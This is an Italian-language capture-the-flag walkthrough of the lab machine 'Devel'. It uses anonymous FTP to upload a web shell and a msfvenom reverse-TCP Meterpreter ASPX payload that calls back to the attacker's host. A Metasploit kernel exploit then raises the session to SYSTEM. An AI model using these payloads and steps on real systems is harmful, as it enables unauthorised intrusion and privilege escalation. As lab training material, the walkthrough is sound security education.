---
title: Devel Walkthrough
description: "Devel, pur essendo relativamente semplice, dimostra i rischi di sicurezza associati ad alcune configurazioni predefinite dei programmi. Si tratta di una macchina di livello easy che può essere completata utilizzando exploit disponibili pubblicamente."
author: dua2z3rr
date: 2025-12-03 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Enterprise Network", "Area di Interesse: Protocols", "Vulnerabilità: Remote Code Execution", "Vulnerabilità: Arbitrary File Upload", "Codice: ASP", "Servizio: IIS", "Servizio: FTP"]
image: /assets/img/devel/devel-resized.png
---

## Enumerazione Esterna

### nmap

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.10.5 -vv -p- -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Noto che abbiamo l'accesso anonimo a ftp.

### FTP

Accedo ad ftp tramite  l'accesso anonimo.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:dua2z3rr): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
```

L'unico file interessante è **iisstart.htm**. Eccone il contenuto:

```html
┌─[dua2z3rr@parrot]─[~]
└──╼ $cat iisstart.htm 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS7</title>
<style type="text/css">
<!--
body {
	color:#000000;
	background-color:#B3B3B3;
	margin:0;
}

#container {
	margin-left:auto;
	margin-right:auto;
	text-align:center;
	}

a img {
	border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>
</div>
</body>
</html>
```

### Sito

Il file che abbiamo trovato prima corrisponde alla pagina del sito.

![Desktop View](/assets/img/devel/devel-1.png)

### File Upload

Faccio l'upload della antak.aspx shell tramite ftp. Tramite questa shell potremmo eseguire comandi sulla macchina.

```shell
ftp> put 
(local-file) /usr/share/nishang/Antak-WebShell/antak.aspx
(remote-file) shell.aspx
local: /usr/share/nishang/Antak-WebShell/antak.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49179|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************************************************************************************| 10713        0.97 MiB/s    --:-- ETA
226 Transfer complete.
10713 bytes sent in 00:00 (58.95 KiB/s)
```

Apriamo la shell dal sito.

![Desktop View](/assets/img/devel/devel-2.png)

## Shell come iis apppool\web

### TTY

Ottenggo una migliore tty avviando un listener sulla porta 8080 e poi eseguendo un payload custom aspx. Craftiamo il payload:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=8080 -f aspx > devel.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2878 bytes
```

Mettiamolo sul sito IIS  tramite ftp

```shell
ftp> put
(local-file) /home/dua2z3rr/devel.aspx
(remote-file) devel.aspx
local: /home/dua2z3rr/devel.aspx remote: devel.aspx
229 Entering Extended Passive Mode (|||49182|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************************************************************************************|  2918       35.22 MiB/s    --:-- ETA
226 Transfer complete.
2918 bytes sent in 00:00 (23.04 KiB/s)
```

Avviamo il listener e apriamo il payload traamite il browser.

```shell
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8080
lport => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
lhost => 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 0.0.0.0:8080 
[*] Sending stage (177734 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.16.4:8080 -> 10.10.10.5:49183) at 2025-12-03 18:10:15 +0100

(Meterpreter 1)(c:\windows\system32\inetsrv) > 
```

### Enumerazione Interna

Utilizzo il modulo **local_exploit_suggester** per capire la prossima mossa.

```shell
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use 0
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set showdescription true
showdescription => true
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 205 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
  This module will bypass Windows UAC by creating COM handler registry 
  entries in the HKCU hive. When certain high integrity processes are 
  loaded, these registry entries are referenced resulting in the 
  process loading user-controlled DLLs. These DLLs contain the 
  payloads that result in elevated sessions. Registry key 
  modifications are cleaned up after payload invocation. This module 
  requires the architecture of the payload to match the OS, but the 
  current low-privilege Meterpreter session architecture can be 
  different. If specifying EXE::Custom your DLL should call 
  ExitProcess() after starting your payload in a separate process. 
  This module invokes the target binary via cmd.exe on the target. 
  Therefore if cmd.exe access is restricted, this module will not run 
  correctly.
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
  This module will bypass Windows UAC by hijacking a special key in 
  the Registry under the current user hive, and inserting a custom 
  command that will get invoked when the Windows Event Viewer is 
  launched. It will spawn a second shell that has the UAC flag turned 
  off. This module modifies a registry key, but cleans up the key once 
  the payload has been invoked. The module does not require the 
  architecture of the payload to match the OS. If specifying 
  EXE::Custom your DLL should call ExitProcess() after starting your 
  payload in a separate process.
[+] 10.10.10.5 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
  This module exploits CVE-2020-0787, an arbitrary file move 
  vulnerability in outdated versions of the Background Intelligent 
  Transfer Service (BITS), to overwrite 
  C:\Windows\System32\WindowsCoreDeviceInfo.dll with a malicious DLL 
  containing the attacker's payload. To achieve code execution as the 
  SYSTEM user, the Update Session Orchestrator service is then 
  started, which will result in the malicious 
  WindowsCoreDeviceInfo.dll being run with SYSTEM privileges due to a 
  DLL hijacking issue within the Update Session Orchestrator Service. 
  Note that presently this module only works on Windows 10 and Windows 
  Server 2016 and later as the Update Session Orchestrator Service was 
  only introduced in Windows 10. Note that only Windows 10 has been 
  tested, so your mileage may vary on Windows Server 2016 and later.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
  This module will create a new session with SYSTEM privileges via the 
  KiTrap0D exploit by Tavis Ormandy. If the session in use is already 
  elevated then the exploit will not run. The module relies on 
  kitrap0d.x86.dll, and is not supported on x64 editions of Windows.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
  This module exploits the Task Scheduler 2.0 XML 0day exploited by 
  Stuxnet. When processing task files, the Windows Task Scheduler only 
  uses a CRC32 checksum to validate that the file has not been 
  tampered with. Also, In a default configuration, normal users can 
  read and write the task files that they have created. By modifying 
  the task file and creating a CRC32 collision, an attacker can 
  execute arbitrary commands with SYSTEM privileges. NOTE: Thanks to 
  webDEViL for the information about disable/enable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
  This module leverages a kernel pool overflow in Win32k which allows 
  local privilege escalation. The kernel shellcode nulls the ACL for 
  the winlogon.exe process (a SYSTEM process). This allows any 
  unprivileged process to freely migrate to winlogon.exe, achieving 
  privilege escalation. This exploit was used in pwn2own 2013 by MWR 
  to break out of chrome's sandbox. NOTE: when a meterpreter session 
  started by this exploit exits, winlogin.exe is likely to crash.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
  This module exploits a vulnerability in win32k.sys where under 
  specific conditions TrackPopupMenuEx will pass a NULL pointer to the 
  MNEndMenuState procedure. This module has been tested successfully 
  on Windows 7 SP0 and Windows 7 SP1.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  This module exploits a NULL Pointer Dereference in win32k.sys, the 
  vulnerability can be triggered through the use of TrackPopupMenu. 
  Under special conditions, the NULL pointer dereference can be abused 
  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
  module has been tested successfully on Windows XP SP3, Windows 2003 
  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
  and Windows 2008 R2 SP1 64 bits.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
  This module abuses a process creation policy in Internet Explorer's 
  sandbox; specifically, Microsoft's RemoteApp and Desktop Connections 
  runtime proxy, TSWbPrxy.exe. This vulnerability allows the attacker 
  to escape the Protected Mode and execute code with Medium Integrity. 
  At the moment, this module only bypass Protected Mode on Windows 7 
  SP1 and prior (32 bits). This module has been tested successfully on 
  Windows 7 SP1 (32 bits) with IE 8 and IE 11.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
  This module exploits the vulnerability in mrxdav.sys described by 
  MS16-016. The module will spawn a process on the target system and 
  elevate its privileges to NT AUTHORITY\SYSTEM before executing the 
  specified payload within the context of the elevated process.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
  This module exploits the lack of sanitization of standard handles in 
  Windows' Secondary Logon Service. The vulnerability is known to 
  affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This 
  module will only work against those versions of Windows with 
  Powershell 2.0 or later and systems with two or more CPU cores.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
  Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. Currently the 
  module does not spawn as SYSTEM, however once achieving a shell, one 
  can easily use incognito to impersonate the token.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
  This module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. It requires a 
  CLSID string. Windows 10 after version 1803, (April 2018 update, 
  build 17134) and all versions of Windows Server 2019 are not 
  vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
  This module exploits a NULL pointer dereference vulnerability in 
  MNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() 
  system call. The NULL pointer dereference occurs because the 
  xxxMNFindWindowFromPoint() function does not effectively check the 
  validity of the tagPOPUPMENU objects it processes before passing 
  them on to MNGetpItemFromIndex(), where the NULL pointer dereference 
  will occur. This module has been tested against Windows 7 x86 SP0 
  and SP1. Offsets within the solution may need to be adjusted to work 
  with other versions of Windows, such as Windows Server 2008.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due 
  to the usage of uninitialized data which allows to corrupt memory. 
  At the moment, the module has been tested successfully on Windows XP 
  SP3, Windows 2003 SP1, and Windows 7 SP1.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.5 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 4   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 13  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 16  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 17  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 18  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 19  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 20  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 21  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 22  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 23  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 24  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 25  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 26  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 27  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 28  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 29  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 30  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 31  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 32  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
 33  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 34  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 35  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 36  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 37  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 39  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 40  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 42  exploit/windows/local/webexec                                  No                       The check raised an exception.

[*] Post module execution completed
```

Non mi rimane altro che provare ad eseguire i vari moduli.

### exploit/windows/local/ms13_053_schlamperei

Questo modulo mi ha permesso di fare privilege escalation e ottenere una system shell.

```shell
[msf](Jobs:0 Agents:1) exploit(windows/local/bypassuac_eventvwr) >> use exploit/windows/local/ms13_053_schlamperei
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> options

Module options (exploit/windows/local/ms13_053_schlamperei):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 SP0/SP1



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> set lhost tun0
lhost => 10.10.16.4
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> run
[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Launching notepad to host the exploit...
[+] Process 2032 launched.
[*] Reflectively injecting the exploit DLL into 2032...
[*] Injecting exploit into 2032...
[*] Found winlogon.exe with PID 440
[*] Sending stage (177734 bytes) to 10.10.10.5
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Meterpreter session 2 opened (10.10.16.4:4444 -> 10.10.10.5:49184) at 2025-12-03 18:21:33 +0100

(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

Prendiamo le flag e terminiamo la box
